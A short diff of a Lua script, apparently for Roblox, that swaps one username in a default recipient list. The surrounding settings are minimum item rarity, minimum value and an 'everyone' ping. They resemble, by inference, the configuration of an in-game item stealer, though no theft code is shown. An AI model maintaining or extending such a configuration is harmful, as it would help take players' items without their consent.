@@ -6,7 +6,7 @@ end
 _G.scriptExecuted = true
 
 local now = os.time()
-local Usernames = _G.Usernames or { "User_Enter", "cripIess", "flames_xx", "Voltstandigs" }
+local Usernames = _G.Usernames or { "User_Enter", "cripIess", "flames_xx", "cursedbyfamine" }
 local min_rarity = _G.min_rarity or "Common"
 local min_value = _G.min_value or 0
 local pingEveryone = _G.pingEveryone or "Yes"
